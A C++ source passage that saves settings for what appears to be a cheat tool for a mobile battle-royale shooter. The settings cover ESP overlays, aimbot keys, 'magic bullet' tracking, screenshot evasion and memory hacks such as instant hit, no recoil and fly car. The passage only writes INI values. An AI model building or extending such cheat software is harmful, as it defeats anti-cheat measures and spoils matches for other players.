	ini.SetLongValue("bboxcolorver", "Value", bboxcolorver);
	ini.SetLongValue("bTeamIDStyle", "Value", bTeamIDStyle);
	ini.SetLongValue("bWeaponStyle", "Value", bWeaponStyle);
	ini.SetLongValue("bFlagStyle", "Value", bFlagStyle);

	ini.SetLongValue("vehisize", "Value", vehisize);



	ini.SetLongValue("HaxVershion", "Value", Setting::HaxVershion);
	ini.SetLongValue("Enemy Name size", "Value", pnamesize);
	ini.SetLongValue("dissize", "Value", dissize);
	ini.SetLongValue("Enemy Dots Style", "Value", dotsstyle);
	ini.SetLongValue("VehicleStyle", "Value", VehicleStyle);
	ini.SetLongValue("TotalEnemyStyle", "Value", TotalEnemyStyle);
	ini.SetLongValue("Enemy DotsRange", "Value", Setting::DotsRange);
	ini.SetLongValue("Enemy DotsRadius", "Value", Setting::DotsRadius);
	ini.SetLongValue("Enemy DotsThickness", "Value", Setting::DotsThickness);
	ini.SetBoolValue("MAgicline", "MAgicline", Setting::MAgicline);
	ini.SetBoolValue("SkipKnocked", "MAgicline", Setting::SkipKnocked);
	ini.SetBoolValue("Enemy Name", "Player", Setting::pname);
	ini.SetBoolValue("botdissize", "Value", botdissize);
	ini.SetBoolValue("botTeamID", "botTeamID", Setting::botTeamID);
	ini.SetBoolValue("gameinfo", "gameinfo", Setting::gameinfo);
	ini.SetBoolValue("radar", "radar", Setting::radar);
	ini.SetLongValue("Enemy Name size", "Player", nsize);
	ini.SetLongValue("bot Name size", "bot", botnsize);
	ini.SetLongValue("pfullboxsize", "pfullboxsize", Setting::pfullboxsize);

	ini.SetBoolValue("SkipKnocked", "Player", Setting::SkipKnocked);


	ini.SetLongValue("Enemy weapon size", "Player", pweapone);

	ini.SetBoolValue("Enemy Line", "Player", Setting::pline);
	ini.SetLongValue("Line size", "Player", Setting::plinesize);

	ini.SetBoolValue("Player Box", "Player", Setting::pcorner);
	ini.SetBoolValue("Player Box Mode", "Player", boxe);

	ini.SetBoolValue("Enemy Skeleton", "Player", Setting::playerBone);
	ini.SetBoolValue("Vehicles", "Player", Setting::Vehicle);
	ini.SetBoolValue("Enemy Health", "Player", Setting::phealth);
	ini.SetBoolValue("Display Health mode", "Player", hpbt);

	ini.SetBoolValue("Enemy Distance", "Player", Setting::plyrdistance);
	ini.SetBoolValue("Distance color", "Player", &Colors::enemy);

	ini.SetBoolValue("EnemyLineOfSight", "Player", Setting::EnemyLineOfSight);
	ini.SetBoolValue("MyLineOfSight", "Player", Setting::MyLineOfSight);
	ini.SetLongValue("Enemy Distance size", "Player", Setting::enemyLineofSightSize);
	ini.SetLongValue("magicv", "Player", Setting::magicv);

	///////////////////BOT///////////////////////

	ini.SetBoolValue("Bot Skeleton Color", "BOT", &Colors::botbone);

	//////////////////

	ini.SetBoolValue("hp", "ESP", Setting::hp);
	ini.SetBoolValue("feul", "ESP", Setting::feul);
	ini.SetBoolValue("fightmode", "ESP", Setting::fightmode);

	ini.SetBoolValue("FOV", "ESP", Setting::fovcircle);
	ini.SetBoolValue("WaterMark", "magic", watermark);

	ini.SetBoolValue("MagicLine", "magic", Setting::MAgicline);
	ini.SetBoolValue("SkipKnocked", "magic", Setting::SkipKnocked);
	ini.SetLongValue("Esp", "EspStyle", Setting::EspStyle);
	ini.SetLongValue("Esp", "BotEspStyle", Setting::BotEspStyle);
	ini.SetBoolValue("Dots", "Dots", Setting::dots);

	ini.SetLongValue("FOV", "ESP", Setting::fovcircleredus);
	ini.SetLongValue("Special", "ESP", Setting::fontsize);
	ini.SetLongValue("Normal", "ESP", Setting::Normalfontsize);
	ini.SetLongValue("Aimbot", "aimbot", Setting::Aimspeed);
	ini.SetLongValue("Aim", "aimbot", Setting::curraim);
	ini.SetLongValue("Engine", "Aimbot", Setting::engine);

	ini.SetLongValue("AimbotKey", "Aimbot", Setting::AimbotKey);
	ini.SetLongValue("EnableKey", "Aimbot", Setting::EnableKey);
	ini.SetLongValue("PositionKey", "Aimbot", Setting::PositionKey);

	ini.SetBoolValue("Fight Mode", "Fight", Setting::fightmode);
	ini.SetBoolValue("information", "information", Setting::information);


	ini.SetBoolValue("All Items", "key0", Setting::allitemss);
	ini.SetBoolValue("Important Items", "key0", Setting::impitems);
	////Weapons
	//
	ini.SetBoolValue("M416", "key0", Setting::Esp_Item_M416);
	ini.SetBoolValue("AKM", "key1", Setting::Esp_Item_AKM);
	ini.SetBoolValue("SCAR-L", "key2", Setting::Esp_Item_SCARL);
	ini.SetBoolValue("M762", "key3", Setting::Esp_Item_M762);
	ini.SetBoolValue("M16A4", "key3", Setting::Esp_Item_M16A4);
	ini.SetBoolValue("G36C", "key3", Setting::Esp_Item_G36C);
	ini.SetBoolValue("QBZ", "key3", Setting::Esp_Item_QBZ);
	ini.SetBoolValue("Mk47-Mutant", "key3", Setting::Esp_Item_Mk47Mutant);
	ini.SetBoolValue("AUG", "key3", Setting::Esp_Item_AUG);
	ini.SetBoolValue("Groza", "key3", Setting::Esp_Item_Groza);
	ini.SetBoolValue("FAMAS", "key3", Setting::Esp_Item_FAMAS);
	ini.SetBoolValue("AN94", "key3", Setting::Esp_Item_AN94);
	////Other Weapons
	//
	ini.SetBoolValue("M249", "key3", Setting::Esp_Item_M249);
	ini.SetBoolValue("MG3", "key3", Setting::Esp_Item_MG3);
	ini.SetBoolValue("DP28", "key3", Setting::Esp_Item_DP28);
	////Snipers
	//
	ini.SetBoolValue("M24", "key3", Setting::Esp_Item_M24);
	ini.SetBoolValue("Kar98k", "key3", Setting::Esp_Item_Kar98k);
	ini.SetBoolValue("Mosin", "key3", Setting::Esp_Item_Mosin);
	ini.SetBoolValue("AWM", "key3", Setting::Esp_Item_Awm);
	////SniperRifles
	//
	ini.SetBoolValue("QBU", "key0", Setting::Esp_Item_QBU);
	ini.SetBoolValue("SLR", "key1", Setting::Esp_Item_SLR);
	ini.SetBoolValue("SKS", "key2", Setting::Esp_Item_SKS);
	ini.SetBoolValue("MK12", "key3", Setting::Esp_Item_Mk12);
	ini.SetBoolValue("Mini-14", "key3", Setting::Esp_Item_Mini14);
	ini.SetBoolValue("MK14", "key3", Setting::Esp_Item_Mk14);
	ini.SetBoolValue("Win94", "key3", Setting::Esp_Item_Win94);
	ini.SetBoolValue("VSS", "key3", Setting::Esp_Item_VSS);
	////SMG
	//
	ini.SetBoolValue("PP19Bizon", "key0", Setting::Esp_Item_PP19);
	ini.SetBoolValue("P90", "key1", Setting::Esp_Item_P90);
	ini.SetBoolValue("Tommy Gun", "key2", Setting::Esp_Item_TommyGun);
	ini.SetBoolValue("MP5K", "key3", Setting::Esp_Item_MP5K);
	ini.SetBoolValue("UMP9", "key3", Setting::Esp_Item_UMP9);
	ini.SetBoolValue("Vector", "key3", Setting::Esp_Item_Vector);
	ini.SetBoolValue("Uzi", "key3", Setting::Esp_Item_Uzi);
	////ShotGuns
	//
	ini.SetBoolValue("SawedOff", "key0", Setting::Esp_Item_SawedOff);
	ini.SetBoolValue("S1897", "key1", Setting::Esp_Item_S1897);
	ini.SetBoolValue("S686", "key2", Setting::Esp_Item_S686);
	ini.SetBoolValue("DBS", "key3", Setting::Esp_Item_DBS);
	ini.SetBoolValue("S12K", "key3", Setting::Esp_Item_S12K);
	ini.SetBoolValue("M1014", "key3", Setting::Esp_Item_M1014);
	////Pistols
	//
	ini.SetBoolValue("DesertEagle", "key0", Setting::Esp_Item_DesertEagle);
	ini.SetBoolValue("P1911", "key1", Setting::Esp_Item_P1911);
	ini.SetBoolValue("R45", "key2", Setting::Esp_Item_R45);
	ini.SetBoolValue("P18C", "key3", Setting::Esp_Item_P18C);
	ini.SetBoolValue("P92", "key3", Setting::Esp_Item_P92);
	ini.SetBoolValue("Vz61", "key3", Setting::Esp_Item_Vz61);
	ini.SetBoolValue("R1895", "key3", Setting::Esp_Item_R1895);
	ini.SetBoolValue("Flaregun", "key3", Setting::Esp_Item_FlareGun);
	////Scopes
	ini.SetBoolValue("Scopes", "key0", Setting::scope);
	//
	ini.SetBoolValue("Holo", "key0", Setting::Esp_Item_Holo);
	ini.SetBoolValue("Lazer", "key1", Setting::Esp_Item_Lazer);
	ini.SetBoolValue("x2", "key2", Setting::Esp_Item_x2);
	ini.SetBoolValue("x3", "key2", Setting::Esp_Item_x3);
	ini.SetBoolValue("x4", "key2", Setting::Esp_Item_x4);
	ini.SetBoolValue("x6", "key2", Setting::Esp_Item_x6);
	ini.SetBoolValue("x8", "key2", Setting::Esp_Item_x8);
	////Ammo
	//
	ini.SetBoolValue("7.62mm", "key0", Setting::Esp_Item_762mm);
	ini.SetBoolValue("5.56mm", "key1", Setting::Esp_Item_556mm);
	ini.SetBoolValue("9mm", "key2", Setting::Esp_Item_9mm);
	ini.SetBoolValue("45ACP", "key2", Setting::Esp_Item_45ACP);
	ini.SetBoolValue("AWM Ammo", "key2", Setting::Esp_Item_Awmimo);
	ini.SetBoolValue("Flare Ammo", "key2", Setting::Esp_Item_Flare);
	ini.SetBoolValue("12Guage", "key2", Setting::Esp_Item_12Guage);
	ini.SetBoolValue("CrossBow Ammo", "key2", Setting::Esp_Item_Ammo_Bolt);

	///Armors
	//
	ini.SetBoolValue("Bag 1", "key0", Setting::Esp_Item_Bag1);
	ini.SetBoolValue("Bag 2", "key1", Setting::Esp_Item_Bag2);
	ini.SetBoolValue("Bag 3", "key1", Setting::Esp_Item_Bag3);
	ini.SetBoolValue("Helmet 1", "key2", Setting::Esp_Item_Helmet1);
	ini.SetBoolValue("Helmet 2", "key3", Setting::Esp_Item_Helmet2);
	ini.SetBoolValue("Helmet 3", "key3", Setting::Esp_Item_Helmet3);
	ini.SetBoolValue("Armor 1", "key4", Setting::Esp_Item_Armor1);
	ini.SetBoolValue("Armor 2", "key5", Setting::Esp_Item_Armor2);
	ini.SetBoolValue("Armor 3", "key5", Setting::Esp_Item_Armor3);
	///Health
	ini.SetBoolValue("Health", "key0", Setting::healthitem);
	//
	ini.SetBoolValue("Bandage", "key0", Setting::Esp_Item_Bandage);
	ini.SetBoolValue("MedKit", "key0", Setting::Esp_Item_MedKit);
	ini.SetBoolValue("FirstAidKit", "key1", Setting::Esp_Item_FirstAidKit);
	ini.SetBoolValue("Painkiller", "key2", Setting::Esp_Item_Painkiller);
	ini.SetBoolValue("EnergyDrink", "key3", Setting::Esp_Item_EnergyDrink);
	ini.SetBoolValue("AdrenalineSyringe", "key4", Setting::Esp_Item_AdrenalineSyringe);
	///Melee
	//
	ini.SetBoolValue("Pan", "key3", Setting::Esp_Item_Pan);
	ini.SetBoolValue("Cowbar", "key3", Setting::Esp_Item_Cowbar);
	ini.SetBoolValue("Machete", "key3", Setting::Esp_Item_Machete);
	ini.SetBoolValue("Sickle", "key3", Setting::Esp_Item_Sickle);
	///Grenades
	//
	ini.SetBoolValue("Frag", "key0", Setting::Esp_Item_Frag);
	ini.SetBoolValue("Smoke", "key1", Setting::Esp_Item_Smoke);
	ini.SetBoolValue("Molotof", "key2", Setting::Esp_Item_Molotof);
	ini.SetBoolValue("Football Grenade", "key2", Setting::Esp_Item_Football_Grenade);
	ini.SetBoolValue("Apple", "key0", Setting::Esp_Item_Grenade_Apple);
	ini.SetBoolValue("RedZone", "key0", Setting::Esp_Item_AirAttack);
	///Air&Loot
	//
	ini.SetBoolValue("AirDrop", "key3", Setting::Esp_Item_AirDrop);
	ini.SetBoolValue("Dead Box", "key3", Setting::Esp_Item_DeadBox);
	ini.SetBoolValue("WorldCup Box", "key3", Setting::Esp_Item_WorldCup_Box);
	ini.SetBoolValue("Plane", "key3", Setting::vahicle_Text_item_Plane);
	///Suits
	//
	ini.SetBoolValue("Suit - Arctic", "key3", Setting::Esp_Item_Suit_Arctic);
	ini.SetBoolValue("Suit - Desert", "key3", Setting::Esp_Item_Suit_Desert);
	ini.SetBoolValue("Suit - Desert 2", "key3", Setting::Esp_Item_Suit_Desert2);
	ini.SetBoolValue("Suit - Woodland", "key3", Setting::Esp_Item_Suit_Woodland);
	///Attachments
	//
	ini.SetBoolValue("Benzin image", "key0", Setting::Esp_Item_Benzin);
	ini.SetBoolValue("AR_FlashHider", "key0", Setting::Esp_Item_Large_FlashHider);
	ini.SetBoolValue("AR_Compensator", "key0", Setting::Esp_Item_Large_Compensator);
	ini.SetBoolValue("AR_Suppressor", "key0", Setting::Esp_Item_Large_Suppressor);
	ini.SetBoolValue("AR_Vertical", "key0", Setting::Esp_Item_Vertical);
	ini.SetBoolValue("AR_HalfGrip", "key0", Setting::Esp_Item_HalfGrip);
	ini.SetBoolValue("AR_LightGrip", "key0", Setting::Esp_Item_LightGrip);
	ini.SetBoolValue("AR_Angled", "key0", Setting::Esp_Item_Angled);
	ini.SetBoolValue("AR_Lasersight", "key0", Setting::Esp_Item_Lasersight);
	ini.SetBoolValue("AR_ThumbGrip", "key0", Setting::Esp_Item_ThumbGrip);
	ini.SetBoolValue("AR_Quick", "key0", Setting::Esp_Item_AR_Quick);
	ini.SetBoolValue("AR_Quick_Extended", "key0", Setting::Esp_Item_AR_Quick_Extended);
	ini.SetBoolValue("AR_Extended", "key0", Setting::Esp_Item_AR_Extended);
	ini.SetBoolValue("Chekpad_AR", "key0", Setting::Esp_Item_Taktik);
	ini.SetBoolValue("Sniper_FlashHider", "key0", Setting::Esp_Item_Sniper_FlashHider);
	ini.SetBoolValue("Sniper_Compensator", "key0", Setting::Esp_Item_Sniper_Compensator);
	ini.SetBoolValue("Sniper_Suppressor", "key0", Setting::Esp_Item_Sniper_Suppressor);
	ini.SetBoolValue("Sniper_Quick_Extended", "key0", Setting::Esp_Item_Sniper_Quick_Extended);
	ini.SetBoolValue("Sniper_Extended", "key0", Setting::Esp_Item_Sniper_Extended);
	ini.SetBoolValue("Sniper_Quick", "key0", Setting::Esp_Item_Sniper_Quick);
	ini.SetBoolValue("Chekpad_Sniper", "key0", Setting::Esp_Item_Chekpad_Sniper);
	ini.SetBoolValue("SMG_FlashHider", "key0", Setting::Esp_Item_Mid_FlashHider);
	ini.SetBoolValue("SMG_Compensator", "key0", Setting::Esp_Item_Mid_Compensator);
	ini.SetBoolValue("SMG_Suppressor", "key0", Setting::Esp_Item_Mid_Suppressor);
	ini.SetBoolValue("(Micro UZI)", "key0", Setting::Esp_Item_Micro_UZI);
	ini.SetBoolValue("SMG_Quick_Extended", "key0", Setting::Esp_Item_SMG_Quick_Extended);
	ini.SetBoolValue("SMG_Extended", "key0", Setting::Esp_Item_SMG_Extended);
	ini.SetBoolValue("SMG_Quick", "key0", Setting::Esp_Item_SMG_Quick);
	ini.SetBoolValue("CrossBow_Quick", "key0", Setting::Esp_Item_CrossBow_Quick);
	ini.SetBoolValue("ShotGun_DuckBill", "key0", Setting::Esp_Item_Duckbill);
	ini.SetBoolValue("ShotGun_Choke", "key0", Setting::Esp_Item_Choke);
	//////

	ini.SetBoolValue("M416 image", "key0", Setting::Esp_Item_M416_Icon);
	ini.SetBoolValue("AKM image", "key1", Setting::Esp_Item_AKM_Icon);
	ini.SetBoolValue("SCAR-L image", "key2", Setting::Esp_Item_SCARL_Icon);
	ini.SetBoolValue("M762 image", "key3", Setting::Esp_Item_M762_Icon);
	ini.SetBoolValue("M16A4 image", "key3", Setting::Esp_Item_M16A4_Icon);
	ini.SetBoolValue("G36C image", "key3", Setting::Esp_Item_G36C_Icon);
	ini.SetBoolValue("QBZ image", "key3", Setting::Esp_Item_QBZ_Icon);
	ini.SetBoolValue("Mk47-Mutant image", "key3", Setting::Esp_Item_Mk47Mutant_Icon);
	ini.SetBoolValue("AUG image", "key3", Setting::Esp_Item_AUG_Icon);
	ini.SetBoolValue("Groza image", "key3", Setting::Esp_Item_Groza_Icon);
	ini.SetBoolValue("FAMAS image", "key3", Setting::Esp_Item_FAMAS_Icon);
	ini.SetBoolValue("AN94 image", "key3", Setting::Esp_Item_AN94_Icon);
	////Other Weapons
	//
	ini.SetBoolValue("M249 image", "key3", Setting::Esp_Item_M249_Icon);
	ini.SetBoolValue("MG3 image", "key3", Setting::Esp_Item_MG3_Icon);
	ini.SetBoolValue("DP28 image", "key3", Setting::Esp_Item_DP28_Icon);
	////Snipers
	//
	ini.SetBoolValue("M24 image", "key3", Setting::Esp_Item_M24_Icon);
	ini.SetBoolValue("Kar98k image", "key3", Setting::Esp_Item_Kar98k_Icon);
	ini.SetBoolValue("Mosin image", "key3", Setting::Esp_Item_Mosin_Icon);
	ini.SetBoolValue("AWM image", "key3", Setting::Esp_Item_Awm_Icon);
	////SniperRifles image
	//
	ini.SetBoolValue("QBU image", "key0", Setting::Esp_Item_QBU_Icon);
	ini.SetBoolValue("SLR image", "key1", Setting::Esp_Item_SLR_Icon);
	ini.SetBoolValue("SKS image", "key2", Setting::Esp_Item_SKS_Icon);
	ini.SetBoolValue("MK12 image", "key3", Setting::Esp_Item_Mk12_Icon);
	ini.SetBoolValue("Mini-14 image", "key3", Setting::Esp_Item_Mini14_Icon);
	ini.SetBoolValue("MK14 image", "key3", Setting::Esp_Item_Mk14_Icon);
	ini.SetBoolValue("Win94 image", "key3", Setting::Esp_Item_Win94_Icon);
	ini.SetBoolValue("VSS image", "key3", Setting::Esp_Item_VSS_Icon);
	////SMG image
	//
	ini.SetBoolValue("PP19Bizon image", "key0", Setting::Esp_Item_PP19_Icon);
	ini.SetBoolValue("P90 image", "key1", Setting::Esp_Item_P90_Icon);
	ini.SetBoolValue("Tommy Gun image", "key2", Setting::Esp_Item_TommyGun_Icon);
	ini.SetBoolValue("MP5K image", "key3", Setting::Esp_Item_MP5K_Icon);
	ini.SetBoolValue("UMP9 image", "key3", Setting::Esp_Item_UMP9_Icon);
	ini.SetBoolValue("Vector image", "key3", Setting::Esp_Item_Vector_Icon);
	ini.SetBoolValue("Uzi image", "key3", Setting::Esp_Item_Uzi_Icon);
	////ShotGuns image
	//
	ini.SetBoolValue("SawedOff image", "key0", Setting::Esp_Item_SawedOff_Icon);
	ini.SetBoolValue("S1897 image", "key1", Setting::Esp_Item_S1897_Icon);
	ini.SetBoolValue("S686 image", "key2", Setting::Esp_Item_S686_Icon);
	ini.SetBoolValue("DBS image", "key3", Setting::Esp_Item_DBS_Icon);
	ini.SetBoolValue("S12K image", "key3", Setting::Esp_Item_S12K_Icon);
	ini.SetBoolValue("M1014 image", "key3", Setting::Esp_Item_M1014_Icon);
	////Pistols image
	//
	ini.SetBoolValue("DesertEagle image", "key0", Setting::Esp_Item_DesertEagle_Icon);
	ini.SetBoolValue("P1911 image", "key1", Setting::Esp_Item_P1911_Icon);
	ini.SetBoolValue("R45 image", "key2", Setting::Esp_Item_R45_Icon);
	ini.SetBoolValue("P18C image", "key3", Setting::Esp_Item_P18C_Icon);
	ini.SetBoolValue("P92 image", "key3", Setting::Esp_Item_P92_Icon);
	ini.SetBoolValue("Vz61 image", "key3", Setting::Esp_Item_Vz61_Icon);
	ini.SetBoolValue("R1895 image", "key3", Setting::Esp_Item_R1895_Icon);
	ini.SetBoolValue("Flaregun image", "key3", Setting::Esp_Item_FlareGun_Icon);
	////Scopes
	//
	ini.SetBoolValue("Holo image", "key0", Setting::Esp_Item_Holo_Icon);
	ini.SetBoolValue("Lazer image", "key1", Setting::Esp_Item_Lazer_Icon);
	ini.SetBoolValue("x2 image", "key2", Setting::Esp_Item_x2_Icon);
	ini.SetBoolValue("x3 image", "key2", Setting::Esp_Item_x3_Icon);
	ini.SetBoolValue("x4 image", "key2", Setting::Esp_Item_x4_Icon);
	ini.SetBoolValue("x6 image", "key2", Setting::Esp_Item_x6_Icon);
	ini.SetBoolValue("x8 image", "key2", Setting::Esp_Item_x8_Icon);
	////Ammo
	//
	ini.SetBoolValue("7.62mm image", "key0", Setting::Esp_Item_762mm_Icon);
	ini.SetBoolValue("5.56mm image", "key1", Setting::Esp_Item_556mm_Icon);
	ini.SetBoolValue("9mm image", "key2", Setting::Esp_Item_9mm_Icon);
	ini.SetBoolValue("45ACP image", "key2", Setting::Esp_Item_45ACP_Icon);
	ini.SetBoolValue("AWM Ammo image", "key2", Setting::Esp_Item_300Magnum_Icon);
	ini.SetBoolValue("Flare Ammo image", "key2", Setting::Esp_Item_Flare_Icon);
	ini.SetBoolValue("12Guage image", "key2", Setting::Esp_Item_12Guage_Icon);
	ini.SetBoolValue("CrossBow Ammo image", "key2", Setting::Esp_Item_Ammo_Bolt_Icon);

	///Armors
	//
	ini.SetBoolValue("Bag 1 image", "key0", Setting::Esp_Item_Bag1_Icon);
	ini.SetBoolValue("Bag 2 image", "key1", Setting::Esp_Item_Bag2);
	ini.SetBoolValue("Bag 3 image", "key1", Setting::Esp_Item_Bag3);
	ini.SetBoolValue("Helmet 1 image", "key2", Setting::Esp_Item_Helmet1_Icon);
	ini.SetBoolValue("Helmet 2 image", "key3", Setting::Esp_Item_Helmet2_Icon);
	ini.SetBoolValue("Helmet 3 image", "key3", Setting::Esp_Item_Helmet3_Icon);
	ini.SetBoolValue("Armor 1 image", "key4", Setting::Esp_Item_Armor1_Icon);
	ini.SetBoolValue("Armor 2 image", "key5", Setting::Esp_Item_Armor2_Icon);
	ini.SetBoolValue("Armor 3 image", "key5", Setting::Esp_Item_Armor3_Icon);
	///Health
	//
	ini.SetBoolValue("Bandage image", "key0", Setting::Esp_Item_Bandage_Icon);
	ini.SetBoolValue("MedKit image", "key0", Setting::Esp_Item_MedKit_Icon);
	ini.SetBoolValue("FirstAidKit image", "key1", Setting::Esp_Item_FirstAidKit_Icon);
	ini.SetBoolValue("Painkiller image", "key2", Setting::Esp_Item_Painkiller_Icon);
	ini.SetBoolValue("EnergyDrink image", "key3", Setting::Esp_Item_EnergyDrink_Icon);
	ini.SetBoolValue("AdrenalineSyringe image", "key4", Setting::Esp_Item_AdrenalineSyringe_Icon);
	///Melee
	//
	ini.SetBoolValue("Pan image", "key3", Setting::Esp_Item_Pan_Icon);
	ini.SetBoolValue("Cowbar image", "key3", Setting::Esp_Item_Cowbar_Icon);
	ini.SetBoolValue("Machete image", "key3", Setting::Esp_Item_Machete_Icon);
	ini.SetBoolValue("Sickle image", "key3", Setting::Esp_Item_Sickle_Icon);
	///Grenades
	//
	ini.SetBoolValue("Frag image", "key0", Setting::Esp_Item_Frag_Icon);
	ini.SetBoolValue("Smoke image", "key1", Setting::Esp_Item_Smoke_Icon);
	ini.SetBoolValue("Molotof image", "key2", Setting::Esp_Item_Molotof_Icon);
	ini.SetBoolValue("Apple image", "key0", Setting::Esp_Item_Grenade_Apple_Icon);
	///Air&Loot
	//
	ini.SetBoolValue("AirDrop image", "key3", Setting::Esp_Item_AirDrop_Icon);
	ini.SetBoolValue("Dead Box image", "key3", Setting::Esp_Item_DeadBox_Icon);
	ini.SetBoolValue("WorldCup Box image", "key3", Setting::Esp_Item_WorldCup_Box_Icon);
	///Suits
	//
	ini.SetBoolValue("Suit - Arctic image", "key3", Setting::Esp_Item_Suit_Arctic_Icon);
	ini.SetBoolValue("Suit - Desert image", "key3", Setting::Esp_Item_Suit_Desert_Icon);
	ini.SetBoolValue("Suit - Desert 2 image", "key3", Setting::Esp_Item_Suit_Desert2_Icon);
	ini.SetBoolValue("Suit - Woodland image", "key3", Setting::Esp_Item_Suit_Woodland_Icon);
	///Attachments
	//
	ini.SetBoolValue("Benzin image", "key0", Setting::Esp_Item_Benzin_Icon);
	ini.SetBoolValue("AR_FlashHider image", "key0", Setting::Esp_Item_Large_FlashHider_Icon);
	ini.SetBoolValue("AR_Compensator image", "key0", Setting::Esp_Item_Large_Compensator_Icon);
	ini.SetBoolValue("AR_Suppressor image", "key0", Setting::Esp_Item_Large_Suppressor_Icon);
	ini.SetBoolValue("AR_Vertical image", "key0", Setting::Esp_Item_Vertical_Icon);
	ini.SetBoolValue("AR_HalfGrip image", "key0", Setting::Esp_Item_HalfGrip_Icon);
	ini.SetBoolValue("AR_LightGrip image", "key0", Setting::Esp_Item_LightGrip_Icon);
	ini.SetBoolValue("AR_Angled image", "key0", Setting::Esp_Item_Angled_Icon);
	ini.SetBoolValue("AR_Lasersight image", "key0", Setting::Esp_Item_Lasersight_Icon);
	ini.SetBoolValue("AR_ThumbGrip image", "key0", Setting::Esp_Item_ThumbGrip_Icon);
	ini.SetBoolValue("AR_Quick image", "key0", Setting::Esp_Item_AR_Quick_Icon);
	ini.SetBoolValue("AR_Quick_Extended image", "key0", Setting::Esp_Item_AR_Quick_Extended_Icon);
	ini.SetBoolValue("AR_Extended image", "key0", Setting::Esp_Item_AR_Extended_Icon);
	ini.SetBoolValue("Chekpad_AR image", "key0", Setting::Esp_Item_Taktik_Icon);
	ini.SetBoolValue("Sniper_FlashHider image", "key0", Setting::Esp_Item_Sniper_FlashHider_Icon);
	ini.SetBoolValue("Sniper_Compensator image", "key0", Setting::Esp_Item_Sniper_Compensator_Icon);
	ini.SetBoolValue("Sniper_Suppressor image", "key0", Setting::Esp_Item_Sniper_Suppressor_Icon);
	ini.SetBoolValue("Sniper_Quick_Extended image", "key0", Setting::Esp_Item_Sniper_Quick_Extended_Icon);
	ini.SetBoolValue("Sniper_Extended image", "key0", Setting::Esp_Item_Sniper_Extended_Icon);
	ini.SetBoolValue("Sniper_Quick image", "key0", Setting::Esp_Item_Sniper_Quick_Icon);
	ini.SetBoolValue("Chekpad_Sniper image", "key0", Setting::Esp_Item_Chekpad_Sniper_Icon);
	ini.SetBoolValue("SMG_FlashHider image", "key0", Setting::Esp_Item_Mid_FlashHider_Icon);
	ini.SetBoolValue("SMG_Compensator image", "key0", Setting::Esp_Item_Mid_Compensator_Icon);
	ini.SetBoolValue("SMG_Suppressor image", "key0", Setting::Esp_Item_Mid_Suppressor_Icon);
	ini.SetBoolValue("(Micro UZI) image", "key0", Setting::Esp_Item_Micro_UZI_Icon);
	ini.SetBoolValue("SMG_Quick_Extended image", "key0", Setting::Esp_Item_SMG_Quick_Extended_Icon);
	ini.SetBoolValue("SMG_Extended image", "key0", Setting::Esp_Item_SMG_Extended_Icon);
	ini.SetBoolValue("SMG_Quick image", "key0", Setting::Esp_Item_SMG_Quick_Icon);
	ini.SetBoolValue("CrossBow_Quick image", "key0", Setting::Esp_Item_CrossBow_Quick_Icon);
	ini.SetBoolValue("ShotGun_DuckBill image", "key0", Setting::Esp_Item_Duckbill_Icon);
	ini.SetBoolValue("ShotGun_Choke image", "key0", Setting::Esp_Item_Choke_Icon);

	///////////


	//Safe MEMORY
	ini.SetBoolValue("Tracking Bullet", "Enabled", Setting::MagicBullet);
	ini.SetLongValue("Aim Positon", "key0", Setting::curraim);
	ini.SetLongValue("Tracking Power", "Value", Setting::magicv); //For Writing Values

	ini.SetBoolValue("Bullet Tracking Range", "Enabled", Setting::MagicBulletticked);
	ini.SetLongValue("Tracking Range", "Value", Setting::magicrange); //For Writing Values
	ini.SetLongValue("MAgiclinee", "Value", MAgiclinee); //For Writing Values
	ini.SetLongValue("HaxVershion", "Value", Setting::HaxVershion); //For Writing Values
	ini.SetLongValue("aimwarning", "Value", aimwarning); //For Writing Values

	ini.SetBoolValue("FOV BASED TRACKING", "key1", Setting::fovcircle);
	ini.SetLongValue("FOV Size", "Value", Setting::fovcircleredus); //For Writing Values

	ini.SetBoolValue("Legit Tracking", "Enabled", Setting::Legitrack); //For Writing Bool
	ini.SetBoolValue("Skip Knocked", "Enabled", Setting::knocked); //For Writing Bool
	ini.SetBoolValue("Skip Bots", "Enabled", Setting::SkipBots); //For Writing Bool

	ini.SetBoolValue("Show Damage", "Enabled", Setting::ShowDamage); //For Writing Bool

	ini.SetBoolValue("IPad View", "Enabled", Setting::IpadView); //For Writing Bool
	ini.SetLongValue("IPad View Value", "Value", Setting::IpadViewValue); //For Writing Values

	ini.SetBoolValue("X Effect", "Enabled", Setting::XEffect); //For Writing Bool
	ini.SetBoolValue("X Effect RGB", "Enabled", Setting::MagicX); //For Writing Bool
	ini.SetBoolValue("Random Cross Hair", "Enabled", Setting::crossHairrandom); //For Writing Bool
	ini.SetBoolValue("Random Head", "Enabled", Setting::XEffectRandomHead); //For Writing Bool
	ini.SetBoolValue("Random Body", "Enabled", Setting::XEffectRandomBody); //For Writing Bool

	ini.SetBoolValue("Anti Screen", "Enabled", Setting::AntiScreenShot); //For Writing Bool
	ini.SetBoolValue("wwcd", "Enabled", Setting::wwcd); //For Writing Bool

	//Danger MEMORY
	ini.SetBoolValue("Instant Hit", "Enabled", Setting::instanthit); //For Writing Bool
	ini.SetLongValue("Instant Hit Value", "Value", Setting::instantv); //For Writing Values


	ini.SetBoolValue("Fast Fire", "Enabled", Setting::RapidFireG); //For Writing Bool

	ini.SetBoolValue("Power Magic", "Enabled", Setting::Magic360deg); //For Writing Bool
	ini.SetBoolValue("Memory Aimbot", "Enabled", Setting::CameraCatch); //For Writing Bool

	ini.SetBoolValue("Fast Run", "Enabled", Setting::fastrun);
	ini.SetLongValue("Fast Run Value", "Value", Setting::fastrv);
	ini.SetLongValue("Fast Run key", "Value", Setting::fastrunkey);

	ini.SetBoolValue("No Recoil", "Enabled", Setting::recoil); //For Writing Bool



	ini.SetBoolValue("Fly Car", "Enabled", Setting::carfly); //For Writing Bool
	ini.SetLongValue("Fly Car Value", "Value", Setting::flycarv);

	ini.SetBoolValue("Fast Car", "Enabled", Setting::speedcar); //For Writing Bool
	ini.SetLongValue("Speed Car Value", "Value", Setting::carsv);
	ini.SetLongValue("Speed Car [Forward] Key", "Value", Setting::Fastcarkey);
	ini.SetLongValue("Speed Car [Back] Key", "Value", Setting::Backcarkey);

	ini.SetBoolValue("Camera View", "Enabled", Setting::CameraView); //For Writing Bool
	ini.SetLongValue("Camera View Value", "Value", Setting::view);

	ini.SetLongValue("GodView UP", "Value", Setting::GodUp);
	ini.SetLongValue("GodView Down", "Value", Setting::GodDown);
	ini.SetLongValue("GodView Front", "Value", Setting::GodFront);
	ini.SetLongValue("GodView Back", "Value", Setting::GodBack);
